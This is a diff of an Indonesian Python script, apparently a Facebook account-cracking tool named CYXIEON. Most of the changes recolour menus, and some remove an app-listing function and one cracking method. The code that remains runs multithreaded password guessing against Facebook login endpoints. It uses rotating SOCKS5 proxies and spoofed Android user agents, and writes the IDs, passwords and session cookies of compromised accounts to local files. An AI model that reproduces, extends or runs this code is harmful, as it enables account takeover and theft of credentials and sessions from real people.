@@ -594,13 +594,13 @@ def dump(idt,fields,cookie,token):
 def hasil_ok():
 	try:vin = os.listdir('CYXIEON-OK')
 	except FileNotFoundError:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		exit(f"{biru}└──[{mer} File tidak di temukan ")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		exit(f"{kun}└──[{mer} File tidak di temukan ")
 	if len(vin)==0:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		exit(f"{biru}└──[{mer} Tidak mempuyai file OK ")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
 	else:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		cih = 0
 		lol = {}
 		for isi in vin:
@@ -611,19 +611,19 @@ def hasil_ok():
 				nom = '0'+str(cih)
 				lol.update({str(cih):str(isi)})
 				lol.update({nom:str(isi)})
-				print(f'{biru}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
+				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
 			else:
 				lol.update({str(cih):str(isi)})
-				print(f'{biru}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		geeh = input(f'{biru}└──[{puti} Input file : ')
+				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		geeh = input(f'{kun}└──[{puti} Input file : ')
 		try:geh = lol[geeh]
 		except KeyError:
-		    print(f"{biru}╭────────────────────────────────────────────{puti}")
-		    exit(f"{biru}└──[{mer} Pilih yang bener :-( ")
+		    print(f"{kun}╭────────────────────────────────────────────{puti}")
+		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
 		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
 		except:
-		    print(f"{biru}╭────────────────────────────────────────────{puti}")
+		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} File tidak di temukan ")
 		nocp=0
 		for cpku in range(len(lin)):
@@ -633,21 +633,21 @@ def hasil_ok():
 			tree.add(f"{hijo}{cpkuni[2]}{puti}")
 			prints(tree)
 			nocp +=1
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		input(f'{biru}└──[{mer} Klik Enter {biru}]')
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		input(f'{kun}└──[{mer} Klik Enter {kun}]')
 		menu()
 
 #----------[ HASIL-CP]----------#            
 def hasil_cp():
 	try:vin = os.listdir('CYXIEON-CP')
 	except FileNotFoundError:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		exit(f"{biru}└──[{mer} File tidak di temukan ")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		exit(f"{kun}└──[{mer} File tidak di temukan ")
 	if len(vin)==0:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		exit(f"{biru}└──[{mer} Tidak mempuyai file OK ")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
 	else:
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		cih = 0
 		lol = {}
 		for isi in vin:
@@ -658,29 +658,29 @@ def hasil_cp():
 				nom = '0'+str(cih)
 				lol.update({str(cih):str(isi)})
 				lol.update({nom:str(isi)})
-				print(f'{biru}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
+				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
 			else:
 				lol.update({str(cih):str(isi)})
-				print(f'{biru}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		geeh = input(f'{biru}└──[{puti} Input file : ')
+				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		geeh = input(f'{kun}└──[{puti} Input file : ')
 		try:geh = lol[geeh]
 		except KeyError:
-		    print(f"{biru}╭────────────────────────────────────────────{puti}")
-		    exit(f"{biru}└──[{mer} Pilih yang bener :-( ")
+		    print(f"{kun}╭────────────────────────────────────────────{puti}")
+		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
 		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
 		except:
-		    print(f"{biru}╭────────────────────────────────────────────{puti}")
-		    exit(f"{biru}└──[{mer} File tidak di temukan ")
+		    print(f"{kun}╭────────────────────────────────────────────{puti}")
+		    exit(f"{kun}└──[{mer} File tidak di temukan ")
 		nocp=0
 		for cpku in range(len(lin)):
 			cpkuni=lin[nocp].split('|')
 			tree = Tree("")
-			tree.add(f"{kun}{cpbirui[0]}{puti}").add(f"{biru}{cpbirui[1]}{puti}")
+			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
 			prints(tree)
 			nocp +=1
-		print(f"{biru}╭────────────────────────────────────────────{puti}")
-		input(f'{biru}└──[{mer} Klik Enter {biru}]')
+		print(f"{kun}╭────────────────────────────────────────────{puti}")
+		input(f'{kun}└──[{mer} Klik Enter {kun}]')
 		menu()
 																		
 #----------[ MENU-IDZ ]----------#		
@@ -694,9 +694,9 @@ def atur_id():
 #----------[ MENU-METODE ]----------#
 def atur_method():
 	print("")
-	print(f"{biru}╭────────────────────────────────────────────{puti}") 
-	print(f'{biru}└──[{puti} 01. Validate ')
-	print(f'{biru}└──[{puti} 02. Reguler ')
+	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
+	print(f'{biru}└──[{puti} {mer}01.{puti} m.prod.facebook.com [{hijo}ON{puti}] ')
+	print(f'{biru}└──[{puti} {mer}02.{puti} m.facebook.com [{hijo}ON{puti}]')
 	print(f"{biru}╭────────────────────────────────────────────{puti}") 
 	CYXIEON_METHODE = input(f'{biru}└──[{puti} Input method : ')
 	if CYXIEON_METHODE in ['1','01']:
@@ -780,8 +780,6 @@ def passwordlist():
 				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
 				elif 'reguler' in method:
 				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
-				elif 'asyinc' in method:
-				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
 				else:
 				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
 				    
@@ -790,9 +788,9 @@ def passwordlist():
 	print(f'{biru}└──[{puti} CP {kun}: %s'%(cp))
 	print(f"{biru}─────────────────────────────────────────────{puti}")
 	print(f"{biru}╭────────────────────────────────────────────{puti}")
-	input(f'{biru}└──[{mer} Klik Enter {biru}]')
+	input(f'{biru}└──[{mer} Klik Enter {kun}]')
+	os.system('clear')
 	menu()
-	
 #----------[ METODE-VALIDATE ]----------#	
 def crackvalidate(idf,pwx,url):
 	global loop,ok,cp
@@ -859,7 +857,6 @@ def crackvalidate(idf,pwx,url):
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
-				cek_apk(ses,kuki)
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
@@ -885,7 +882,7 @@ def crackreguler(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot}(Reguler)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s) "%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}(REGULER)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -894,7 +891,6 @@ def crackreguler(idf,pwx,url):
 			nip = rc(proxs)
 			proxs = {'http': 'socks5://'+nip}
 			ua = random.choice(["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Redmi 9 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
-			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]) 		
 			ses.headers.update(
 			{
 			"Host":url,
@@ -945,7 +941,6 @@ def crackreguler(idf,pwx,url):
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
-				cek_apk(ses,kuki)
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
@@ -963,7 +958,6 @@ def crackreguler(idf,pwx,url):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-	
 #----------[ CEK-OPSI ]----------#
 def ceker(idf,pw):
 	global cp
@@ -1027,26 +1021,6 @@ def ceker(idf,pw):
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
-#----------------------[ CEK-APLIKASI ]---------------------#
-def cek_apk(ses,kuki):
-	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
